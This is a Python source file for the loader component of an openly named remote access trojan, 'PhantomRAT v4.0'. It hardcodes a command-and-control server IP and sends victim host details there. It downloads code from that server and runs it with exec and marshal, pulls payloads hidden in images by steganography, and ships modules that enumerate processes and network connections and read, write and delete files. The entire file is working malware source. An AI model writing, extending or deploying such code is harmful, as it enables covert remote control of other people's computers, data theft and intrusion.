#!/usr/bin/env python3
"""
PhantomRAT Modules Loader v4.0
Advanced dynamic module loading with encryption, steganography, and remote code execution.
Enhanced for C2 v4.0 integration and security.
"""

import importlib.util
import sys
import os
import base64
import hashlib
import json
import time
import uuid
import socket
import inspect
import threading
import marshal
import zlib
import pickle
from pathlib import Path
from datetime import datetime
from cryptography.fernet import Fernet

# ==================== CONFIGURATION ====================
C2_SERVER = "http://141.105.71.196:8000"  # Your C2 IP
MODULE_CACHE_DIR = ".phantom_modules"
SESSION_ID = str(uuid.uuid4())[:8]

# Load profile if available
try:
    with open('malleable_profile.json', 'r') as f:
        PROFILE = json.load(f)
        USER_AGENT = PROFILE.get('security', {}).get('user_agent', 
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
except:
    USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

# ==================== ENCRYPTION ====================
class PhantomEncryption:
    """Encryption handler for module loading"""
    
    def __init__(self, key=None):
        if key is None:
            # Generate key from system info
            system_hash = hashlib.sha256(
                f"{socket.gethostname()}{os.getpid()}{time.time()}".encode()
            ).digest()[:32]
            key = system_hash
        
        if isinstance(key, str):
            key = key.encode()
        
        # Ensure 32 bytes
        if len(key) < 32:
            key = key.ljust(32, b'0')[:32]
        
        fernet_key = base64.urlsafe_b64encode(key)
        self.fernet = Fernet(fernet_key)
        self.master_key = key
    
    def encrypt(self, data):
        """Encrypt data"""
        if isinstance(data, dict):
            data = json.dumps(data, separators=(',', ':'))
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        try:
            return self.fernet.encrypt(data).decode('utf-8')
        except:
            return base64.b64encode(data).decode('utf-8')
    
    def decrypt(self, encrypted_data):
        """Decrypt data"""
        try:
            if isinstance(encrypted_data, str):
                encrypted_data = encrypted_data.encode('utf-8')
            
            decrypted = self.fernet.decrypt(encrypted_data).decode('utf-8')
            try:
                return json.loads(decrypted)
            except:
                return decrypted
        except:
            try:
                return base64.b64decode(encrypted_data).decode('utf-8')
            except:
                return None

# Initialize encryption
encryption = PhantomEncryption()

# ==================== MODULE CACHE MANAGEMENT ====================
class ModuleCache:
    """Manage cached modules for performance and stealth"""
    
    def __init__(self, cache_dir=MODULE_CACHE_DIR):
        self.cache_dir = Path(cache_dir)
        self.cache_dir.mkdir(exist_ok=True, parents=True)
        self.loaded_modules = {}
        self.module_hashes = {}
        
    def get_cache_path(self, module_name, version=None):
        """Get cache path for module"""
        if version:
            return self.cache_dir / f"{module_name}_{version}.phantom"
        return self.cache_dir / f"{module_name}.phantom"
    
    def cache_module(self, module_name, code, metadata=None):
        """Cache module code with metadata"""
        cache_file = self.get_cache_path(module_name)
        
        # Create cache entry
        cache_entry = {
            'name': module_name,
            'code': code,
            'hash': hashlib.sha256(code.encode()).hexdigest(),
            'timestamp': time.time(),
            'metadata': metadata or {},
            'hostname': socket.gethostname(),
            'session_id': SESSION_ID
        }
        
        # Encrypt cache entry
        encrypted_entry = encryption.encrypt(cache_entry)
        
        with open(cache_file, 'w') as f:
            f.write(encrypted_entry)
        
        self.module_hashes[module_name] = cache_entry['hash']
        return True
    
    def load_from_cache(self, module_name):
        """Load module from cache"""
        cache_file = self.get_cache_path(module_name)
        
        if not cache_file.exists():
            return None
        
        try:
            with open(cache_file, 'r') as f:
                encrypted_entry = f.read()
            
            cache_entry = encryption.decrypt(encrypted_entry)
            
            if not cache_entry or 'code' not in cache_entry:
                return None
            
            # Verify hash
            current_hash = hashlib.sha256(cache_entry['code'].encode()).hexdigest()
            if current_hash != cache_entry.get('hash'):
                print(f"[!] Cache integrity check failed for {module_name}")
                return None
            
            return cache_entry['code']
        except Exception as e:
            print(f"[!] Cache load error: {e}")
            return None
    
    def clear_cache(self):
        """Clear all cached modules"""
        try:
            for cache_file in self.cache_dir.glob("*.phantom"):
                cache_file.unlink()
            return True
        except Exception as e:
            print(f"[!] Cache clear error: {e}")
            return False
    
    def get_cache_stats(self):
        """Get cache statistics"""
        cache_files = list(self.cache_dir.glob("*.phantom"))
        
        return {
            'total_modules': len(cache_files),
            'cache_size': sum(f.stat().st_size for f in cache_files),
            'loaded_modules': len(self.loaded_modules),
            'cached_hashes': len(self.module_hashes)
        }

# Initialize module cache
module_cache = ModuleCache()

# ==================== C2 COMMUNICATION ====================
def send_to_c2(endpoint, data, timeout=30):
    """Send data to C2 server"""
    import requests
    
    headers = {
        'User-Agent': USER_AGENT,
        'X-Phantom-Module': 'Loader',
        'X-Phantom-Session': SESSION_ID,
        'X-Phantom-Version': '4.0',
        'Content-Type': 'application/octet-stream'
    }
    
    try:
        encrypted_data = encryption.encrypt(data)
        
        response = requests.post(
            f"{C2_SERVER}{endpoint}",
            data=encrypted_data,
            headers=headers,
            timeout=timeout,
            verify=False
        )
        
        if response.status_code == 200:
            try:
                return encryption.decrypt(response.content)
            except:
                return {'status': 'success', 'raw': response.text[:100]}
        return {'error': f'HTTP {response.status_code}'}
    except Exception as e:
        print(f"[!] C2 communication error: {e}")
        return {'error': str(e)}

def request_module(module_name, version=None):
    """Request module from C2 server"""
    print(f"[*] Requesting module: {module_name}")
    
    request_data = {
        'type': 'module_request',
        'module_name': module_name,
        'version': version,
        'session_id': SESSION_ID,
        'hostname': socket.gethostname(),
        'platform': sys.platform,
        'python_version': sys.version,
        'timestamp': time.time()
    }
    
    response = send_to_c2('/phantom/modules', request_data)
    
    if response and 'error' not in response:
        if 'module_code' in response:
            return response['module_code']
        elif 'module_data' in response:
            return response['module_data']
    
    print(f"[-] Failed to get module {module_name} from C2")
    return None

# ==================== STEGANOGRAPHY SUPPORT ====================
class SteganographyHandler:
    """Handle steganographic module hiding"""
    
    SUPPORTED_FORMATS = ['png', 'jpg', 'jpeg', 'bmp', 'gif']
    
    @staticmethod
    def extract_from_lsb(image_data):
        """Extract hidden data from LSB steganography"""
        try:
            # Simple LSB extraction (conceptual)
            extracted = bytearray()
            bit_buffer = 0
            bit_count = 0
            
            # Parse through image bytes
            for byte in image_data:
                # Extract LSB
                for bit_pos in range(8):
                    bit = (byte >> bit_pos) & 1
                    bit_buffer = (bit_buffer << 1) | bit
                    bit_count += 1
                    
                    if bit_count == 8:
                        extracted.append(bit_buffer)
                        bit_buffer = 0
                        bit_count = 0
            
            return bytes(extracted)
        except Exception as e:
            print(f"[!] LSB extraction error: {e}")
            return None
    
    @staticmethod
    def extract_from_exif(image_path):
        """Extract data from EXIF metadata"""
        try:
            from PIL import Image
            img = Image.open(image_path)
            exif_data = img._getexif()
            
            if exif_data:
                # Look for custom tags
                for tag_id, value in exif_data.items():
                    if isinstance(value, str) and value.startswith('PHANTOM:'):
                        encoded_data = value[8:]  # Remove 'PHANTOM:' prefix
                        return base64.b64decode(encoded_data)
            return None
        except ImportError:
            print(f"[!] PIL/Pillow not installed for EXIF extraction")
            return None
        except Exception as e:
            print(f"[!] EXIF extraction error: {e}")
            return None
    
    @staticmethod
    def extract_from_dct(image_data):
        """Extract data from DCT coefficients (JPEG)"""
        # This would require more complex JPEG parsing
        # Placeholder for actual implementation
        print(f"[*] DCT extraction not fully implemented")
        return None

# ==================== MODULE LOADING ENGINE ====================
class ModuleLoader:
    """Advanced module loading engine"""
    
    def __init__(self):
        self.loaded_modules = {}
        self.module_dependencies = {}
        self.load_history = []
        
    def load_python_module(self, module_name, code, execute_now=True):
        """Load Python module from source code"""
        try:
            # Generate unique module name
            unique_name = f"phantom_module_{module_name}_{int(time.time())}"
            
            # Create module spec
            spec = importlib.util.spec_from_loader(
                unique_name, 
                loader=None,
                origin=f'phantom://{module_name}'
            )
            
            # Create module
            module = importlib.util.module_from_spec(spec)
            
            # Execute code in module namespace
            exec_globals = module.__dict__
            exec_globals['__name__'] = unique_name
            exec_globals['__phantom_loaded__'] = True
            exec_globals['__session_id__'] = SESSION_ID
            
            # Add helper functions
            exec_globals['_phantom_send'] = send_to_c2
            exec_globals['_phantom_encrypt'] = encryption.encrypt
            exec_globals['_phantom_decrypt'] = encryption.decrypt
            
            if execute_now:
                exec(code, exec_globals)
            
            # Add to sys.modules
            sys.modules[unique_name] = module
            
            # Track loading
            self.loaded_modules[module_name] = {
                'name': unique_name,
                'original_name': module_name,
                'loaded_at': time.time(),
                'code_hash': hashlib.sha256(code.encode()).hexdigest(),
                'executed': execute_now
            }
            
            self.load_history.append({
                'module': module_name,
                'timestamp': datetime.now().isoformat(),
                'status': 'loaded',
                'executed': execute_now
            })
            
            # Cache the module
            module_cache.cache_module(module_name, code)
            
            return module
            
        except Exception as e:
            print(f"[!] Error loading module {module_name}: {e}")
            import traceback
            traceback.print_exc()
            
            self.load_history.append({
                'module': module_name,
                'timestamp': datetime.now().isoformat(),
                'status': 'error',
                'error': str(e)
            })
            
            return None
    
    def load_compiled_module(self, module_name, compiled_code):
        """Load compiled Python bytecode"""
        try:
            # Decompress if needed
            if compiled_code[:2] == b'\x78\x9c':  # zlib header
                compiled_code = zlib.decompress(compiled_code)
            
            # Unmarshal bytecode
            code_obj = marshal.loads(compiled_code)
            
            # Create module
            module = type(sys)('compiled_module')
            module.__file__ = f'<phantom-compiled://{module_name}>'
            
            # Execute bytecode
            exec(code_obj, module.__dict__)
            
            self.loaded_modules[module_name] = {
                'name': module_name,
                'type': 'compiled',
                'loaded_at': time.time()
            }
            
            return module
            
        except Exception as e:
            print(f"[!] Error loading compiled module: {e}")
            return None
    
    def load_from_stego(self, image_path, extraction_method='lsb'):
        """Load module hidden in image"""
        try:
            with open(image_path, 'rb') as f:
                image_data = f.read()
            
            handler = SteganographyHandler()
            extracted_data = None
            
            if extraction_method == 'lsb':
                extracted_data = handler.extract_from_lsb(image_data)
            elif extraction_method == 'exif':
                extracted_data = handler.extract_from_exif(image_path)
            elif extraction_method == 'dct':
                extracted_data = handler.extract_from_dct(image_data)
            
            if extracted_data:
                # Try to decode as module
                try:
                    # First try as text (Python source)
                    code = extracted_data.decode('utf-8')
                    return self.load_python_module(f'stego_{os.path.basename(image_path)}', code)
                except UnicodeDecodeError:
                    # Try as compiled code
                    return self.load_compiled_module(f'stego_{os.path.basename(image_path)}', extracted_data)
            
            return None
            
        except Exception as e:
            print(f"[!] Stego load error: {e}")
            return None
    
    def load_remote_module(self, module_name, version=None, use_cache=True):
        """Load module from remote C2 server"""
        print(f"[*] Loading remote module: {module_name}")
        
        # Check cache first
        if use_cache:
            cached_code = module_cache.load_from_cache(module_name)
            if cached_code:
                print(f"[+] Using cached version of {module_name}")
                return self.load_python_module(module_name, cached_code)
        
        # Request from C2
        module_data = request_module(module_name, version)
        
        if not module_data:
            print(f"[-] Failed to load remote module {module_name}")
            return None
        
        # Determine if it's source or compiled
        if isinstance(module_data, str):
            # Source code
            return self.load_python_module(module_name, module_data)
        elif isinstance(module_data, bytes):
            # Try as compiled code
            return self.load_compiled_module(module_name, module_data)
        else:
            print(f"[!] Unknown module data format for {module_name}")
            return None
    
    def execute_module_function(self, module_name, function_name, *args, **kwargs):
        """Execute a function from a loaded module"""
        if module_name not in self.loaded_modules:
            print(f"[!] Module {module_name} not loaded")
            return None
        
        module = sys.modules.get(self.loaded_modules[module_name]['name'])
        if not module:
            print(f"[!] Module {module_name} not found in sys.modules")
            return None
        
        if not hasattr(module, function_name):
            print(f"[!] Function {function_name} not found in module {module_name}")
            return None
        
        try:
            func = getattr(module, function_name)
            result = func(*args, **kwargs)
            
            # Log execution
            self.load_history.append({
                'module': module_name,
                'function': function_name,
                'timestamp': datetime.now().isoformat(),
                'status': 'executed',
                'args': str(args)[:100],
                'kwargs': str(kwargs)[:100]
            })
            
            return result
            
        except Exception as e:
            print(f"[!] Error executing {function_name}: {e}")
            
            self.load_history.append({
                'module': module_name,
                'function': function_name,
                'timestamp': datetime.now().isoformat(),
                'status': 'error',
                'error': str(e)
            })
            
            return None
    
    def get_module_info(self, module_name):
        """Get information about a loaded module"""
        if module_name not in self.loaded_modules:
            return None
        
        module = sys.modules.get(self.loaded_modules[module_name]['name'])
        if not module:
            return None
        
        info = {
            'name': module_name,
            'loaded_name': self.loaded_modules[module_name]['name'],
            'loaded_at': datetime.fromtimestamp(
                self.loaded_modules[module_name]['loaded_at']
            ).isoformat(),
            'functions': [],
            'variables': [],
            'type': self.loaded_modules[module_name].get('type', 'source')
        }
        
        # Get functions and variables
        for name in dir(module):
            if not name.startswith('_'):
                obj = getattr(module, name)
                if callable(obj):
                    info['functions'].append(name)
                else:
                    info['variables'].append(name)
        
        return info
    
    def unload_module(self, module_name):
        """Unload a module"""
        if module_name not in self.loaded_modules:
            return False
        
        try:
            module_loaded_name = self.loaded_modules[module_name]['name']
            
            # Remove from sys.modules
            if module_loaded_name in sys.modules:
                del sys.modules[module_loaded_name]
            
            # Remove from our tracking
            del self.loaded_modules[module_name]
            
            print(f"[+] Unloaded module: {module_name}")
            return True
            
        except Exception as e:
            print(f"[!] Error unloading module {module_name}: {e}")
            return False

# Initialize module loader
module_loader = ModuleLoader()

# ==================== BUILT-IN MODULES ====================
class BuiltInModules:
    """Built-in module definitions"""
    
    @staticmethod
    def get_system_info_module():
        """System information module"""
        code = """
import platform
import psutil
import socket
import os
from datetime import datetime

def get_system_info():
    \"\"\"Get comprehensive system information\"\"\"
    info = {
        'timestamp': datetime.now().isoformat(),
        'hostname': socket.gethostname(),
        'os': platform.system(),
        'os_version': platform.version(),
        'architecture': platform.machine(),
        'cpu_cores': psutil.cpu_count(logical=True),
        'memory_total': psutil.virtual_memory().total,
        'memory_available': psutil.virtual_memory().available,
        'disk_usage': {},
        'network_interfaces': []
    }
    
    # Disk usage
    for partition in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            info['disk_usage'][partition.mountpoint] = {
                'total': usage.total,
                'used': usage.used,
                'free': usage.free,
                'percent': usage.percent
            }
        except:
            pass
    
    # Network interfaces
    for interface, addrs in psutil.net_if_addrs().items():
        interface_info = {'name': interface, 'addresses': []}
        for addr in addrs:
            if addr.family == socket.AF_INET:
                interface_info['addresses'].append({
                    'address': addr.address,
                    'netmask': addr.netmask
                })
        if interface_info['addresses']:
            info['network_interfaces'].append(interface_info)
    
    return info

def get_process_list(limit=20):
    \"\"\"Get list of running processes\"\"\"
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
        try:
            processes.append(proc.info)
            if len(processes) >= limit:
                break
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return processes

def get_network_connections():
    \"\"\"Get network connections\"\"\"
    connections = []
    for conn in psutil.net_connections(kind='inet'):
        try:
            connections.append({
                'fd': conn.fd,
                'family': conn.family,
                'type': conn.type,
                'laddr': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                'raddr': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                'status': conn.status,
                'pid': conn.pid
            })
        except:
            continue
    return connections
"""
        return code
    
    @staticmethod
    def get_file_operations_module():
        """File operations module"""
        code = """
import os
import shutil
import hashlib
import base64
from pathlib import Path

def list_files(directory='.', pattern='*', recursive=False):
    \"\"\"List files in directory\"\"\"
    path = Path(directory)
    files = []
    
    if recursive:
        glob_pattern = f'**/{pattern}'
    else:
        glob_pattern = pattern
    
    for file_path in path.glob(glob_pattern):
        if file_path.is_file():
            try:
                stat = file_path.stat()
                files.append({
                    'path': str(file_path),
                    'name': file_path.name,
                    'size': stat.st_size,
                    'modified': stat.st_mtime,
                    'is_dir': False
                })
            except:
                continue
    
    return files

def read_file(filepath, encoding='utf-8'):
    \"\"\"Read file content\"\"\"
    try:
        with open(filepath, 'r', encoding=encoding) as f:
            return f.read()
    except Exception as e:
        return f'Error reading file: {e}'

def write_file(filepath, content, encoding='utf-8'):
    \"\"\"Write content to file\"\"\"
    try:
        with open(filepath, 'w', encoding=encoding) as f:
            f.write(content)
        return True
    except Exception as e:
        return False

def file_hash(filepath, algorithm='sha256'):
    \"\"\"Calculate file hash\"\"\"
    try:
        hasher = hashlib.new(algorithm)
        with open(filepath, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b''):
                hasher.update(chunk)
        return hasher.hexdigest()
    except:
        return None

def copy_file(src, dst):
    \"\"\"Copy file\"\"\"
    try:
        shutil.copy2(src, dst)
        return True
    except:
        return False

def delete_file(filepath):
    \"\"\"Delete file\"\"\"
    try:
        os.remove(filepath)
        return True
    except:
        return False
"""
        return code

# ==================== MAIN MODULE LOADER INTERFACE ====================
def load_module(module_name, source='remote', **kwargs):
    """Main module loading interface"""
    print(f"[*] Loading module: {module_name} from {source}")
    
    if source == 'remote':
        return module_loader.load_remote_module(module_name, **kwargs)
    
    elif source == 'local':
        filepath = kwargs.get('filepath')
        if not filepath:
            print(f"[!] No filepath provided for local module")
            return None
        
        try:
            with open(filepath, 'r') as f:
                code = f.read()
            return module_loader.load_python_module(module_name, code)
        except Exception as e:
            print(f"[!] Error loading local module: {e}")
            return None
    
    elif source == 'stego':
        image_path = kwargs.get('image_path')
        method = kwargs.get('method', 'lsb')
        
        if not image_path:
            print(f"[!] No image path provided for stego module")
            return None
        
        return module_loader.load_from_stego(image_path, method)
    
    elif source == 'builtin':
        builtin_modules = {
            'system_info': BuiltInModules.get_system_info_module(),
            'file_ops': BuiltInModules.get_file_operations_module()
        }
        
        if module_name in builtin_modules:
            return module_loader.load_python_module(
                module_name, 
                builtin_modules[module_name]
            )
        else:
            print(f"[!] Unknown built-in module: {module_name}")
            return None
    
    else:
        print(f"[!] Unknown source type: {source}")
        return None

def execute_module_function(module_name, function_name, *args, **kwargs):
    """Execute function from loaded module"""
    return module_loader.execute_module_function(module_name, function_name, *args, **kwargs)

def get_loaded_modules():
    """Get list of loaded modules"""
    return list(module_loader.loaded_modules.keys())

def get_module_info(module_name):
    """Get information about a loaded module"""
    return module_loader.get_module_info(module_name)

# ==================== TEST AND DEBUG ====================
def test_module_loading():
    """Test module loading functionality"""
    print(f"[*] Testing module loader...")
    
    # Test built-in module
    print(f"[*] Loading built-in system_info module...")
    module = load_module('system_info', source='builtin')
    
    if module:
        print(f"[+] Module loaded successfully")
        
        # Execute function
        result = execute_module_function('system_info', 'get_system_info')
        if result:
            print(f"[+] System info retrieved: {result.get('hostname')}")
    
    # Test cache
    print(f"\n[*] Testing module cache...")
    stats = module_cache.get_cache_stats()
    print(f"[+] Cache stats: {stats}")
    
    return True

# ==================== COMMAND LINE INTERFACE ====================
def main():
    """Command line interface"""
    import argparse
    
    parser = argparse.ArgumentParser(description='PhantomRAT Modules Loader v4.0')
    parser.add_argument('--load', type=str, help='Load a module by name')
    parser.add_argument('--source', type=str, default='remote', 
                       choices=['remote', 'local', 'stego', 'builtin'],
                       help='Source of module')
    parser.add_argument('--file', type=str, help='Local file path for module')
    parser.add_argument('--image', type=str, help='Image file for stego module')
    parser.add_argument('--execute', type=str, help='Execute function from loaded module')
    parser.add_argument('--args', type=str, help='Arguments for function (JSON)')
    parser.add_argument('--list', action='store_true', help='List loaded modules')
    parser.add_argument('--info', type=str, help='Get info about loaded module')
    parser.add_argument('--test', action='store_true', help='Run tests')
    parser.add_argument('--clear-cache', action='store_true', help='Clear module cache')
    
    args = parser.parse_args()
    
    if args.test:
        test_module_loading()
        return
    
    if args.clear_cache:
        if module_cache.clear_cache():
            print(f"[+] Cache cleared successfully")
        else:
            print(f"[-] Failed to clear cache")
        return
    
    if args.list:
        modules = get_loaded_modules()
        if modules:
            print(f"\n[+] Loaded modules ({len(modules)}):")
            for module in modules:
                info = get_module_info(module)
                if info:
                    print(f"    • {module} ({len(info['functions'])} functions)")
        else:
            print(f"[-] No modules loaded")
        return
    
    if args.info:
        info = get_module_info(args.info)
        if info:
            print(f"\n[+] Module info for {args.info}:")
            print(f"    Loaded as: {info['loaded_name']}")
            print(f"    Loaded at: {info['loaded_at']}")
            print(f"    Type: {info['type']}")
            print(f"    Functions: {', '.join(info['functions'][:10])}")
            if len(info['functions']) > 10:
                print(f"    ... and {len(info['functions']) - 10} more")
        else:
            print(f"[-] Module {args.info} not found or not loaded")
        return
    
    if args.load:
        kwargs = {}
        if args.source == 'local' and args.file:
            kwargs['filepath'] = args.file
        elif args.source == 'stego' and args.image:
            kwargs['image_path'] = args.image
        
        module = load_module(args.load, source=args.source, **kwargs)
        
        if module:
            print(f"[+] Module {args.load} loaded successfully")
            
            if args.execute:
                # Parse arguments if provided
                func_args = []
                func_kwargs = {}
                
                if args.args:
                    try:
                        parsed_args = json.loads(args.args)
                        if isinstance(parsed_args, list):
                            func_args = parsed_args
                        elif isinstance(parsed_args, dict):
                            func_kwargs = parsed_args
                    except:
                        print(f"[!] Invalid JSON arguments")
                
                result = execute_module_function(args.load, args.execute, *func_args, **func_kwargs)
                
                if result is not None:
                    print(f"[+] Function executed successfully")
                    print(f"[+] Result: {result}")
                else:
                    print(f"[-] Function execution failed")
        else:
            print(f"[-] Failed to load module {args.load}")
    
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
